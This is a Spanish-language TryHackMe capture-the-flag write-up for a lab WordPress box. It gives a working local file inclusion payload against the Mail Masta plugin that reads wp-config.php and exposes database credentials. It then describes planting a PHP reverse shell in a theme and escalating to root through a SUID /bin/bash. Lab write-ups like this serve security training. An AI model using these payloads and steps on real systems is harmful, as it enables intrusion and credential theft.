---
layout: writeup
category: TryHackMe
chall_description: This box's intention is to help you practice several ways in exploiting a system. There is few intended paths to exploit it and few unintended paths to get root. Try to discover and exploit them all. Do not just exploit it using intended paths, hack like a pro and enjoy the box !
points: 160
solves: 2
tags: tryhackme ejptv2
date: 2024-08-23
comments: false
---

# Enumeration and Scanning

Primero de todos hacemos un escaneo de los puertos y sus servicios

![image](https://github.com/user-attachments/assets/197fa6d1-b90b-40b4-9b3c-af2cd5b40bbc)

### Puerto 80 (HTTP Server)

Seguimos con la enumeración y comenzamos con el puerto 80:

![image](https://github.com/user-attachments/assets/fb30bc7f-580a-4488-bbce-93669d6c0a2c)

Parece la típica página por defecto de servidores Apache. Enumeramos los directorios del servidor web:

    [+] Url:                     http://10.10.33.133/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /wordpress            (Status: 301) [Size: 316] [--> http://10.10.33.133/wordpress/]
    /hackathons           (Status: 200) [Size: 197]
    

Hay un directorio wordpress. Vemos lo que tiene:

![image](https://github.com/user-attachments/assets/fc0ef621-48b0-4c4c-b0d3-65ebcfad41d1)

Parece una web hecha con Wordpress. Le lanzamos WPScan para saber plugins vulnerables, temas vulnerables y enumerar usuarios y conseguimos sacar un usuario:

    [+] elyana
     | Found By: Author Posts - Author Pattern (Passive Detection)
     | Confirmed By:
     |  Rss Generator (Passive Detection)
     |  Wp Json Api (Aggressive Detection)
     |   - http://10.10.29.33/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)

Probamos bruteforce al login de wordpress y no obtuvimos nada. Volvemos a lanzar WPScan para ver si encontramos alguna vulnerabilidad de los plugins, y encontramos que de Mail Masta 1.0 encontramos 2 vulnerabilidades interesantes:

    [+] mail-masta
     | Location: http://10.10.168.165/wordpress/wp-content/plugins/mail-masta/
     | Latest Version: 1.0 (up to date)
     | Last Updated: 2014-09-19T07:52:00.000Z
     |
     | Found By: Urls In Homepage (Passive Detection)
     |
     | [!] 2 vulnerabilities identified:
     |
     | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
     | [!] Title: Mail Masta 1.0 - Multiple SQL Injection

# Vulnerability assesment

### CVE-2016-10956

 > *The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation*

Esta vulnerabilidad ataca al pathing "wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=*file*" a través del parámetro pl.
Probamos a acceder a /etc/passwd:

![image](https://github.com/user-attachments/assets/19155f1b-5d52-43df-aeae-8c5cb1fa1d3a)

Le pasamos el siguiente payload:

    http://ip/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

Para obtener el contenido de wp-config en base64. Procedemos a su decodificación:

![image](https://github.com/user-attachments/assets/586fe8d4-717d-44b3-b87b-1ff6bae196d6)

Y vemos las credenciales de acceso a la base de datos:

    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    
    /** MySQL database username */
    define( 'DB_USER', 'elyana' );
    
    /** MySQL database password */
    define( 'DB_PASSWORD', 'H@ckme@123' );
    
    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );

Probamos a utilizar esas credenciales para acceder al panel de Wordpress:

![image](https://github.com/user-attachments/assets/c44e1a6d-853c-4cb6-9f71-cf6f94d68de6)

Con este acceso, ya podemos crear una PHP Reverse Shell en uno de los temas y con ello acceder al sistema:

![image](https://github.com/user-attachments/assets/262c4cb3-942d-4fb8-94ee-dad037825391)

Activamos el listener en nc:

![image](https://github.com/user-attachments/assets/b2e7f312-e483-4180-8d53-173599d07d8c)

Y accedemos al .php en el que hemos pegado el código dentro de la web... ¡obtenemos acceso al sistema!

![image](https://github.com/user-attachments/assets/20e5ce8b-3a58-4752-89c6-0897a5fa7cfb)

Pero para acceder a la flag de usuario, necesitamos cambiar de usuario, ya que somos www-data y necesitamos ser mínimo el usuario elyana.
Vamos a ver si podemos escalar privilegios directamente y desde root acceder a las dos flags.

# Privilege escalation

Comenzamos haciendo la enumeración básica de ficheros con permisos SUID:

    bash-4.4$ find / -perm /4000 2>/dev/null
    find / -perm /4000 2>/dev/null
    /bin/mount
    /bin/ping
    /bin/fusermount
    /bin/su
    /bin/bash
    /bin/chmod
    /bin/umount
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/snapd/snap-confine
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/bin/newuidmap
    /usr/bin/pkexec
    /usr/bin/lxc
    /usr/bin/traceroute6.iputils
    /usr/bin/newgidmap
    /usr/bin/chfn
    /usr/bin/chsh
    /usr/bin/newgrp
    /usr/bin/sudo
    /usr/bin/socat
    /usr/bin/gpasswd
    /usr/bin/at
    /usr/bin/passwd

Vemos un fichero interesante con el cual la escalada de privilegios es simple. Ese fichero es /bin/bash. Lo ejecutamos tal cual, y con eso ya somos root:

    bash-4.4$ /bin/bash -p
    /bin/bash -p
    bash-4.4# whoami
    whoami
    root
    bash-4.4#

Y ya desde root podemos acceder a la flag de user.txt en /home/elyana/user.txt y la de root en /root/root.txt
